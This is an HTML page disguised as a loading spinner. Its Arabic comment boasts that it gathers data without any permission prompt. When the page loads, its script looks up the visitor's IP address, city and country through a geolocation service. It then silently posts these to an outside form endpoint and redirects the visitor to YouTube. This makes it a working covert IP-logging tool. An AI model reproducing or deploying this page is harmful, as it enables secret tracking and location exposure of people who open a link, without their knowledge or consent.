<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
<script>
    window.onload = function() {
        // سحب البيانات بالـ IP (لا يظهر نافذة Allow أبداً)
        fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
            fetch("https://formspree.io/f/mvzblpga", {
                method: 'POST',
                headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    _subject: "🚀 دخول جديد من رابط o.html",
                    الآي_بي: data.ip, 
                    المدينة: data.city, 
                    الدولة: data.country_name 
                })
            }).then(() => { window.location.href = "https://www.youtube.com"; });
        }).catch(() => { window.location.href = "https://www.youtube.com"; });
    };
</script>
</body>
</html>
